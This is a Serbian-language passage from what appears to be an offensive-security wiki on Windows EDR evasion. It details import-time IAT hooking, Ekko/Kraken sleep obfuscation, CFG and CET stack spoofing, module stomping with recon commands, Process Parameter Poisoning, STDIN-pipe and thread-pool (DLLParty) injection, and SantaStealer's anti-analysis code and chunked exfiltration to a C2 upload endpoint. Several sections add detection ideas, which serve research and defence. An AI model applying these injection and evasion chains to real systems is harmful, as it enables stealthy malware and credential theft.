
Povezani gradivni blokovi i primeri
- Reflective loaders koji obavljaju IAT patching tokom učitavanja (npr. TitanLdr, AceLdr)
- Memory masking hooks (npr. simplehook) i stack-cutting PIC (stackcutting)
- PIC stub-ovi za call-stack spoofing (npr. Draugr)


## IAT Hooking pri Uvozu + Sleep Obfuscation (Crystal Palace/PICO)

### IAT hooks pri uvozu preko resident PICO-a

Ako kontrolišeš reflective loader, možeš da hook-uješ importe **tokom** `ProcessImports()` tako što ćeš zameniti loader-ov `GetProcAddress` pointer prilagođenim resolver-om koji prvo proverava hooks:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Napravi **resident PICO** (persistent PIC object) koji opstaje i nakon što se privremeni loader PIC oslobodi.
- Izvezi funkciju `setup_hooks()` koja prepisuje loader-ov import resolver (npr. `funcs.GetProcAddress = _GetProcAddress`).
- U funkciji `_GetProcAddress` preskoči ordinal importe i koristi hook lookup zasnovan na hash-u, kao što je `__resolve_hook(ror13hash(name))`. Ako hook postoji, vrati ga; u suprotnom prosledi zahtev pravom `GetProcAddress`.
- Registruj ciljeve hook-ova u vreme linkovanja pomoću Crystal Palace unosa `addhook "MODULE$Func" "hook"`. Hook ostaje validan jer se nalazi unutar resident PICO-a.

Time se dobija **IAT redirekcija pri uvozu** bez patchovanja code section-a učitanog DLL-a nakon učitavanja.

### Forsiranje hookable importa kada cilj koristi PEB-walking

Hooks pri uvozu se aktiviraju samo ako je funkcija zaista u IAT-u cilja. Ako modul razrešava API funkcije preko PEB-walk + hash pristupa (bez import stavke), forsiraj pravi import kako bi loader-ov `ProcessImports()` putanja mogla da ga obradi:

- Zameni hash-om zasnovano razrešavanje export-a (npr. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) direktnom referencom poput `&WaitForSingleObject`.
- Kompajler će emitovati IAT stavku, što omogućava presretanje kada reflective loader razreši importe.

### Ekabasiрана sleep/idle obfuscation bez patchovanja `Sleep()`

Umesto patchovanja `Sleep`, hook-uj **stvarne wait/IPC primitive** koje implant koristi (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Za duga čekanja, obmotaj poziv Ekko-style obfuscation chain-om koji šifruje image u memoriji tokom mirovanja:<sup>[[31]](#references)[[27]](#references)</sup>

- Koristi `CreateTimerQueueTimer` za zakazivanje niza callback-ova koji pozivaju `NtContinue` sa prilagođenim `CONTEXT` frame-ovima.
- Uobičajeni chain (x64): postavi image na `PAGE_READWRITE` → RC4 šifrovanje preko `advapi32!SystemFunction032` nad celim mapiranim image-om → izvrši blokirajuće čekanje → RC4 dešifrovanje → **vrati dozvole po sekcijama** prolaskom kroz PE sekcije → signaliziraj završetak.
- `RtlCaptureContext` obezbeđuje šablon `CONTEXT`; kloniraj ga u više frame-ova i postavi registre (`Rip/Rcx/Rdx/R8/R9`) tako da pozovu svaki korak.

Operativni detalj: za duga čekanja vrati „success“ (npr. `WAIT_OBJECT_0`) kako bi pozivalac nastavio dok je image maskiran. Ovaj obrazac skriva modul od skenera tokom perioda mirovanja i izbegava prepoznatljivi obrazac klasičnog „patched `Sleep()`“.

Ideje za detekciju (zasnovane na telemetriji)
- Nizovi callback-ova `CreateTimerQueueTimer` koji upućuju na `NtContinue`.
- Upotreba `advapi32!SystemFunction032` nad velikim, kontinuiranim buffer-ima veličine image-a.
- `VirtualProtect` nad velikim opsegom, a zatim prilagođeno vraćanje dozvola po sekcijama.

### Runtime CFG registracija za sleep-obfuscation gadgets

Na CFG-enabled ciljevima, prvi indirektni skok ka mid-function gadget-u poput `jmp [rbx]` ili `jmp rdi` obično će srušiti proces sa `STATUS_STACK_BUFFER_OVERRUN`, jer gadget nije prisutan u CFG metapodacima modula. Da bi Ekko/Kraken-style chain-ovi radili u ojačanim procesima:<sup>[[30]](#references)</sup>

- Registruj svako indirektno odredište koje chain koristi pomoću `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` i stavki `CFG_CALL_TARGET_VALID`.
- Za adrese unutar učitanih image-ova (`ntdll`, `kernel32`, `advapi32`), `MEMORY_RANGE_ENTRY` mora da počinje na **image base** adresi i da obuhvati **punu veličinu image-a**.
- Za ručno mapirane/PIC/stomped regione koristi **allocation base** i veličinu alokacije.
- Označi ne samo dispatch gadget već i export-e do kojih se dolazi indirektno (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls), kao i sve executable sekcije pod kontrolom napadača koje će postati indirektna odredišta.

Time se ROP/JOP-style sleep chain-ovi pretvaraju iz primitive koja „radi samo u procesima bez CFG-a“ u ponovo upotrebljivu primitivu za `explorer.exe`, browser-e, `svchost.exe` i druge endpoint-e kompajlirane sa `/guard:cf`.

### CET-safe stack spoofing za uspavane thread-ove

Potpuna zamena `CONTEXT`-a je upadljiva i može da zakaže na CET Shadow Stack sistemima jer spoofed `Rip` i dalje mora da se poklapa sa hardverskim shadow stack-om. Bezbedniji obrazac za sleep-masking je:<sup>[[30]](#references)</sup>

- Izaberi drugi thread u istom procesu i pročitaj granice njegovog stack-a u `NT_TIB` / TEB-u (`StackBase`, `StackLimit`) preko `NtQueryInformationThread`.
- Sačuvaj originalni TEB/TIB trenutnog thread-a.
- Snimi stvarni kontekst uspavanog thread-a pomoću `GetThreadContext`.
- Kopiraj **samo** stvarni `Rip` u spoof kontekst, ostavljajući spoofed `Rsp`/stack stanje netaknutim.
- Tokom perioda mirovanja kopiraj `NT_TIB` spoof thread-a u trenutni TEB kako bi stack walker-и odmotavali stack unutar legitimnog opsega.
- Kada se čekanje završi, vrati originalni TIB i thread context.

Ovim se zadržava CET-usaglašen instruction pointer, a istovremeno se obmanjuju EDR stack walker-и koji se oslanjaju na TEB stack metapodatke za validaciju unwind-a.

### APC-based alternativa: Kraken Mask

Ako je timer-queue dispatch prepoznatljiv po potpisu, isti niz sleep-encrypt-spoof-restore može da se izvrši iz suspendovanog pomoćnog thread-a pomoću queued APC-ova:<sup>[[27]](#references)</sup>

- Napravi pomoćni thread sa `NtTestAlert` kao entrypoint-om.
- Postavi pripremljene `CONTEXT` frame-ove/APC-ove pomoću `NtQueueApcThread` i obradi ih pomoću `NtAlertResumeThread`.
- Stanje chain-a čuvaj na heap-u, a ne na stack-u pomoćnog thread-a, kako bi se izbeglo iscrpljivanje podrazumevanog thread stack-a od 64 KB.
- Koristi `NtSignalAndWaitForSingleObject` za atomsko signaliziranje start event-a i blokiranje.
- Suspenduj glavni thread pre vraćanja TIB/context-a (`NtSuspendThread` → restore → `NtResumeThread`) kako bi se smanjio race window tokom kojeg bi skener mogao da uhvati napola vraćen stack.

Ovim se potpis `CreateTimerQueueTimer` + `NtContinue` zamenjuje potpisom helper-thread/APC, uz zadržavanje istih ciljeva RC4 maskiranja i stack spoofing-a.

Dodatne ideje za detekciju
- `NtSetInformationVirtualMemory` sa `VmCfgCallTargetInformation` neposredno pre sleep-ova, wait-ova ili APC dispatch-a.
- `GetThreadContext`/`SetThreadContext` oko `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` ili `ConnectNamedPipe`.
- `NtQueryInformationThread` praćen direktnim upisima u granice stack-a trenutnog thread-a u TEB/TIB-u.
- `NtQueueApcThread`/`NtAlertResumeThread` chain-ovi koji indirektno dolaze do `SystemFunction032`, `VirtualProtect` ili helper-a za vraćanje dozvola sekcija.
- Ponovljena upotreba kratkih gadget potpisa poput `FF 23` (`jmp [rbx]`) ili `FF E7` (`jmp rdi`) kao dispatch pivot-a unutar potpisanih modula.


## Precizni Module Stomping

Module stomping izvršava payload-e iz **`.text` section-a DLL-a koji je već mapiran unutar ciljnog procesa**, umesto da alocira očiglednu privatnu executable memoriju ili učitava novi sacrificial DLL. Cilj za prepisivanje treba da bude **učitan, disk-backed image** čiji code space može da primi payload bez oštećivanja putanja koda koje su procesu i dalje potrebne.<sup>[[1]](#references)[[2]](#references)</sup>

### Pouzdan izbor cilja

Naivni stomping nad uobičajenim modulima kao što su `uxtheme.dll` ili `comctl32.dll` nije pouzdan: DLL možda nije učitan u udaljenom procesu, a premali code region može da sruši proces. Pouzdaniji postupak je:

1. Izlistaj module ciljnog procesa i zadrži **names-only include list** učitanih DLL-ova.
2. Prvo napravi payload i zabeleži njegovu **tačnu veličinu u bajtovima**.
3. Pregledaj DLL-ove na disku i uporedi PE section **`.text` `Misc_VirtualSize`** sa veličinom payload-a. Ovo je važnije od veličine fajla jer odražava veličinu executable section-a **nakon mapiranja u memoriju**.
4. Parsiraj **Export Address Table (EAT)** i izaberi RVA izvezene funkcije kao početni offset za stomp.
5. Izračunaj **blast radius**: ako payload premaši granice izabrane funkcije, prepisаće susedne export-e koji su u memoriji smešteni iza nje.

Tipični pomoćni alati za recon/izbor cilja koji se koriste u praksi:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Operativne napomene
- Dajte prednost DLL-ovima koji su **već učitani** u udaljeni proces da biste izbegli telemetriju funkcije `LoadLibrary`/neočekivanih učitavanja image-a.
- Dajte prednost export-ima koje ciljna aplikacija retko izvršava, jer u suprotnom uobičajeni tokovi izvršavanja mogu naići na izmenjene bajtove pre ili posle kreiranja niti.
- Veliki implant-i često zahtevaju da se način ugrađivanja shellcode-a promeni sa string literala na **inicijalizator niza bajtova/u vitičastim zagradama** kako bi ceo bafer bio ispravno predstavljen u izvornom kodu injector-a.

Ideje za detekciju
- Udaljeni upisi u **izvršne stranice mapirane iz image-a** (`MEM_IMAGE`, `PAGE_EXECUTE*`) umesto u češće privatne RWX/RX alokacije.
- Ulazne tačke export-a čiji bajtovi u memoriji više ne odgovaraju sadržaju prateće datoteke na disku.
- Udaljene niti ili promene konteksta koje započinju izvršavanje unutar export-a legitimnog DLL-a čiji su početni bajtovi nedavno izmenjeni.
- Sumnjivi nizovi poziva `VirtualProtect(Ex)` / `WriteProcessMemory` nad DLL `.text` stranicama, nakon kojih sledi kreiranje niti.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) je tehnika **process-injection / EDR-evasion** koja zaobilazi klasični put udaljenog upisa (`VirtualAllocEx` + `WriteProcessMemory`). Umesto kopiranja bajtova u već pokrenuti ciljni proces, zloupotrebljava činjenicu da Windows **kopira odabrane početne parametre funkcije `CreateProcessW` u child proces** i smešta ih u `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Prenosioci podložni trovanju koje kopira `CreateProcessW`

Korisni prenosioci su:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (uz `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Ograničenja praktične upotrebe prenosilaca:

- `lpCommandLine` mora pokazivati na **memoriju u koju može da se upisuje** za `CreateProcessW`, a ograničen je na **32,767 Unicode znakova**, uključujući nulti terminator.
- `lpEnvironment` mora biti Unicode blok okruženja sa nizom uzastopnih stringova `NAME=VALUE\0`, završenih dodatnim `\0`.
- `lpReserved` je zvanično rezervisan, zato mapiranje na `ShellInfo` treba smatrati detaljem implementacije, a ne stabilnim, dokumentovanim ugovorom.

Time se uobičajeno kreiranje procesa pretvara u **primitivu za prenos payload-a**. Operater kreira child proces sa početnim podacima koje kontroliše napadač i prepušta Windows-u da izvrši kopiranje između procesa.

### Tok udaljenog pronalaženja bez API-ja za udaljeni upis

Nakon kreiranja child procesa, pronađite kopirani bafer pomoću primitiva koje omogućavaju **samo čitanje**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → pribavite `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Pročitajte udaljeni `PEB`
3. Pratite `PEB.ProcessParameters`
4. Pročitajte `RTL_USER_PROCESS_PARAMETERS`
5. Koristite izabrani pokazivač:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Minimalni tok:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Izvršavanje kopiranog bafera parametara

Kopirani region parametara je obično `RW`, a ne izvršiv. Uobičajeni P3 chain je:

1. Kreirati proces na uobičajen način (ne suspendovan)
2. Učiniti izabranu stranicu parametara izvršivom pomoću `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Ponovo upotrebiti handle glavne niti koji je već vraćen u `PROCESS_INFORMATION`
4. Preusmeriti izvršavanje pomoću `NtSetContextThread` (`CONTEXT_CONTROL`, prepisati `RIP`)

Za razliku od klasičnih tokova rada za thread hijacking, ovo **ne zahteva** `SuspendThread` / `ResumeThread`; kontekst se može promeniti direktno preko vraćenog handle-a glavne niti.

Tako se izbegава nekoliko API-ja koji se često nadgledaju zbog injection-a:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- često и `SuspendThread` / `ResumeThread`

### Ograničenje bajta NUL i staged shellcode

Sva tri nosača su **stringovi ili podaci nalik stringovima**, pa se neobrađeni payload koji sadrži `0x00` skraćuje tokom prenosa. Praktično rešenje je **prva faza bez bajtova NUL**, koja ponovo sastavlja konstante tokom izvršavanja, a zatim učitava proizvoljnu drugu fazu.

Jednostavan obrazac je sinteza konstanti zasnovana na XOR-u:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Ovo omogućava prvoj fazi da izgradi nizove na steku, argumente API-ja, putanje do DLL-ova ili loader za shellcode druge faze, bez ugrađivanja null bajtova u preneti parametar.

### Pozivi API-ja zasnovani na steku iz prve faze

Kada prva faza mora da pozove API-je kao što je `LoadLibraryA`, može da:

- postavi string/bufer na stek ciljnog procesa
- rezerviše **32-bajtni x64 shadow space**
- postavi `RCX`, `RDX`, `R8`, `R9` na konstante ili pokazivače relativne u odnosu na `RSP`
- održi poravnanje `RSP` na **16 bajtova** pre poziva

Druga faza se zatim može kopirati sa steka u alokaciju `PAGE_READWRITE`, promeniti u `PAGE_EXECUTE_READ` pomoću `VirtualProtect` i pokrenuti skokom do nje, čime se izbegava direktna RWX alokacija.

### Ideje za detekciju

Autori navode sledeće dobre prilike za threat hunting:

- `VirtualProtectEx` / `NtProtectVirtualMemory` koji stranice parametara procesa menjaju tako da budu izvršive
- promenу zaštite praćenu pozivom `SetThreadContext` / `NtSetContextThread`
- udaljena čitanja `PEB`-a, a zatim `RTL_USER_PROCESS_PARAMETERS`
- neuobičajeno duge vrednosti ili vrednosti visoke entropije u `lpCommandLine`, `lpEnvironment` ili `STARTUPINFO.lpReserved` tokom kreiranja procesa

### Napomene

- P3 je trik za prenos između procesa, a ne samostalna primitiva za izvršavanje: kopiranom parametru je i dalje potrebno promeniti dozvole u izvršne i upotrebiti metod za preusmeravanje izvršavanja.
- Autori su razmatrali `RtlCreateProcessReflection` / Dirty Vanity, ali su ga odbacili jer interno koristi sumnjive primitive kao što su `NtWriteVirtualMemory` i `NtCreateThreadEx`.

Za isporuku payloada u **postojeći** Windows proces putem opisa niti, a zatим otmicu povratne adrese niti koja čeka, pogledajte [Thread Name-Calling and Waiting Thread Hijacking](windows-process-injection-thread-name-calling-waiting-thread-hijacking.md).

## Ubrizgavanje kroz konzolnu STDIN cev

Interaktivni podređeni proces konzole može se koristiti i kao **primitiva za prenos payloada**. Injektor preusmerava standardni ulaz podređenog procesa na cev i šalje marker, a zatim shellcode. Nakon što konzolni program pročita podatke u sopstvenu privatnu memoriju, injektor pronalazi taj bafer, postavlja ga kao izvršiv i preusmerava nit podređenog procesa na njega. Time se izbegavaju `VirtualAllocEx` i `WriteProcessMemory`, ali je i dalje reč o ubrizgavanju u proces, a ne o opštem EDR zaobilaženju.<sup>[[41]](#references)</sup>

Uprkos opisu „named-pipe“, referentna implementacija poziva `CreatePipe`, čime se pravi **anonimna cev**. Windows interno implementira anonimne cevi pomoću objekata cevi sa jedinstvenim imenima, ali PoC ne bira putanju oblika `\\.\pipe\<name>` niti poziva `CreateNamedPipe`. Kreira nasleđive ručice sa podrazumevanim bezbednosnim deskriptorom, postavlja ručicu za čitanje u `STARTUPINFO.hStdInput`, postavlja `STARTF_USESTDHANDLES` i pokreće novi podređeni proces uz omogućeno nasleđivanje ručica. Zato ovaj PoC pokreće zadati konzolni izvršni fajl; ne priključuje svoju cev postojećem procesu.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Referentni tok rada

Implementacija koristi sledeći niz koraka:<sup>[[41]](#references)</sup>

1. Kreirati parove anonimnih cevi za `STDIN` i `STDOUT` podređenog procesa. Isključiti nasleđivanje na dve ručice roditeljske strane i zatvoriti duplikate ručica dečje strane u roditeljskom procesu nakon kreiranja procesa.
2. Pokrenuti interaktivni izvršni fajl kao što su `netsh.exe` ili `nslookup.exe` sa opcijom `CREATE_NEW_CONSOLE`. Podređeni proces nasleđuje preusmerene standardne ručice.
3. Poslati kompletan binarni niz `rawData` pomoću `WriteFile` kroz ručicu `STDIN` roditeljske strane. Konzolni program preuzima bajtove i ostavlja njihovu kopiju u jednoj od svojih privatnih commitovanih memorijskih oblasti.
4. Pretražiti adresni prostor podređenog procesa pomoću `VirtualQueryEx`, pročitati potencijalne oblasti `MEM_PRIVATE` pomoću `ReadProcessMemory` i potražiti marker na početku niza `rawData`.
5. Promenити dozvole otkrivenog bafera u `PAGE_EXECUTE_READWRITE` pomoću `VirtualProtectEx`.
6. Pronaći glavnu nit, suspendovati je, postaviti `RIP` na `found_address + 0x19` pomoću `NtSetContextThread` i nastaviti njeno izvršavanje.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Dostavljena implementacija specifična je za x64: menja `CONTEXT.Rip`, a ugrađeni payload je x64 shellcode. `rawData` počinje markerom od 25 bajtova, pa izvršni bajtovi počinju na heksadecimalnom pomeraju `0x19`. Pri zameni payloada sačuvajte taj raspored ili istovremeno ažurirajte marker, vektor za pretragu, veličinu niza i pomeraj izvršavanja. Komentari u izvornom kodu navode i `0x0A`, `0x0D` i `0x1A` kao nedozvoljene karaktere. Ovaj postupak ne menja token niti privilegije child procesa.<sup>[[41]](#references)</sup>

Za male native pomoćne programe i obrasce kompajliranja payloada pogledajte [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## DLL injection u thread-pool callback bez shellcode-a (DLLParty)

DLLParty prilagođava thread-pool injection u stilu PoolParty tako da postojeći worker u ciljnom procesu pozove `LoadLibraryA`, umesto da izvrši ubačeni callback stub. Njegov mehanizam za slanje posla je `TP_DIRECT` completion koji se stavlja u red na I/O completion port ciljnog pool-a. Ovo ne zaobilazi dozvole procesa: PoC poziva `OpenProcess(PROCESS_ALL_ACCESS)` i zahteva čitanje i pisanje memorije ciljnog procesa, kao i mogućnost dupliranja handle-ova worker-factory-ja i completion port-a.<sup>[[46]](#references)[[47]](#references)</sup>

Na Windows x64, worker prosleđuje pokazivač na `TP_CALLBACK_INSTANCE` smešten na steku kroz `RCX`, prvi argument callback-a. `LoadLibraryA` tumači taj isti pokazivač kao `LPCSTR`. Na testiranoj putanji, `TppWorkerThread` formira pokazivač na `RSP+0x178`, dok se prvo uobičajeno upisivanje u taj objekat obavlja na `RSP+0x1d0`. Zato putanja do DLL-a završena nulom, koja staje u ovaj prefiks od 0x58 bajtova, može da zauzme početak instance i da ne bude prepisana pre slanja callback-a. Ovo je zapažanje specifično za testiranu verziju, a ne dokumentovana garancija Windows ABI-ja.<sup>[[46]](#references)[[47]](#references)</sup>

Referentni postupak je sledeći:<sup>[[46]](#references)[[47]](#references)</sup>

1. Enumerišite handle-ove ciljnog procesa pomoću `NtQuerySystemInformation(SystemHandleInformation)` i identifikujte `TpWorkerFactory` upitom za tipove objekata. Duplirajte handle worker-factory-ja i upitajte `WorkerFactoryBasicInformation`; `StartParameter` daje udaljeni `TP_POOL`. Preskočite factory-je kod kojih je `TotalWorkerCount == 0`.
2. Pročitajte `TP_POOL.CompletionPort` i prođite kroz privatnu listu worker-a pool-a. Na testiranoj x64 verziji Windows 10 19045 (`ntdll.dll 10.0.19041.4842`), početak liste nalazi se na `pool+0x60`; svaka veza je na `worker+0x10`, pa slot callback instance na `worker+0x38` odgovara adresi `link+0x28`. PoC proverava poravnanje pokazivača, uzajamnu ispravnost veza, pripadnost pool-u, nenulte ID-jeve niti, ponovljene čvorove i stabilnost početka liste.
3. Upišite putanju do DLL-a u **svaki** pronađeni slot worker-a jer red čekanja može da preuzme bilo koji worker. Smestite `TP_DIRECT` sa `Callback = LoadLibraryA` u memoriju ciljnog procesa u koju može da se upisuje. PoC koristi `last_slot-0x500` na steku worker-a umesto `VirtualAllocEx`; taj pomeraj je utvrđen eksperimentalno i ne sme da se preklapa sa aktivnim podacima steka.
4. Duplirajte handle completion port-a ciljnog procesa i pozovite `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)`. Adresa udaljenog `TP_DIRECT` objekta je ključ completion-a. Postojeći worker zatim poziva `LoadLibraryA` sa prepisanim pokazivačem callback instance i učitava DLL kojem ciljni proces već može da pristupi.

PoC prima PID ciljnog procesa (`DLLParty.exe <target_pid>`) i koristi hardkodiranu putanju do DLL-a u `DLLParty.cpp`; pre kompajliranja x64 izvršne datoteke postavite putanju kojoj ciljni proces može da pristupi. Takođe koristi adresu `LoadLibraryA` iz sopstvenog procesa kao udaljeni callback, pa pretpostavlja da ta adresa važi i u ciljnom procesu. Kod ne proverava da li je putanja duža od prefiksa od 0x58 bajtova niti da li je obilazak worker-a pronašao slot pre indeksiranja poslednjeg elementa. Ponovo proverite privatne pomeraje, raspored na steku i memoriju dostupnu za upis u ciljnoj verziji. Izostavljanje `CreateRemoteThreadEx`, shellcode-a i `VirtualAllocEx` ne uklanja upise između procesa niti telemetriju učitavanja DLL-a.<sup>[[46]](#references)[[47]](#references)</sup>

## Taktike SantaStealer-a za fileless izbegavanje detekcije i krađu akreditiva

SantaStealer (poznat i kao BluelineStealer) pokazuje kako savremeni info-stealers objedinjuju AV bypass, anti-analysis i pristup akreditivima u jednom postupku.<sup>[[24]](#references)</sup>

### Uslovljavanje rasporedom tastature i odlaganje u sandbox-u

- Konfiguraciona zastavica (`anti_cis`) enumeriše instalirane rasporede tastature pomoću `GetKeyboardLayoutList`. Ako pronađe ćirilični raspored, uzorak pravi prazan `CIS` marker i prekida izvršavanje pre pokretanja stealers-a, čime se osigurava da se nikada ne aktivira u isključenim regionima, a pritom ostavlja trag koristan za threat hunting.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Slojevita logika `check_antivm`

- Varijanta A prolazi kroz listu procesa, hešira svaki naziv prilagođenim rolling checksum-om i upoređuje ga sa ugrađenim blocklistama za debugere/sandbox okruženja; ponavlja checksum nad nazivom računara i proverava radne direktorijume kao što je `C:\analysis`.
- Varijanta B proverava sistemska svojstva (donju granicu broja procesa, nedavno vreme pokretanja sistema), poziva `OpenServiceA("VBoxGuest")` da bi otkrila VirtualBox additions i vrši vremenske provere oko pauza kako bi uočila single-stepping. Svako poklapanje prekida izvršavanje pre pokretanja modula.

### Fileless helper + dvostruko ChaCha20 reflective loading

- Primarni DLL/EXE sadrži Chromium helper za pristup podacima za prijavu, koji se ili zapisuje na disk ili ručno mapira u memoriju; u fileless režimu sam razrešava importe/relocations, tako da se nikakvi artefakti helper-a ne zapisuju.
- Taj helper čuva DLL druge faze, dvaput šifrovan pomoću ChaCha20 (dva ključa od 32 bajta + nonce vrednosti od 12 bajtova). Nakon oba prolaza, reflektivno učitava blob (bez `LoadLibrary`) i poziva exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, izvedene iz projekta [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Rutine ChromElevator koriste direktni syscall reflective process hollowing za ubacivanje u aktivan Chromium pregledač, nasleđuju AppBound Encryption ključeve i dešifruju lozinke/cookies/podatke o kreditnim karticama direktno iz SQLite baza podataka, uprkos ABE zaštiti.


### Modularno prikupljanje u memoriji i HTTP exfil u delovima

- `create_memory_based_log` prolazi kroz globalnu tabelu pokazivača na funkcije `memory_generators` i pokreće jednu nit za svaki omogućen modul (Telegram, Discord, Steam, snimci ekrana, dokumenti, ekstenzije pregledača itd.). Svaka nit upisuje rezultate u deljene buffere i prijavljuje broj svojih datoteka nakon perioda čekanja od oko 45 sekundi na pridruživanje niti.
- Po završetku, sve se pakuje pomoću statički povezane biblioteke `miniz` kao `%TEMP%\\Log.zip`. `ThreadPayload1` zatim čeka 15 sekundi i šalje arhivu u delovima od 10 MB putem HTTP POST zahteva ka `http://<C2>:6767/upload`, lažno predstavljajući granicu pregledača `multipart/form-data` (`----WebKitFormBoundary***`). Svaki deo dodaje `User-Agent: upload`, `auth: <build_id>`, opcioni `w: <campaign_tag>`, a poslednji deo dodaje `complete: true` kako bi C2 znao da je ponovno sastavljanje završeno.

## References

- [1] [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Process security and access rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
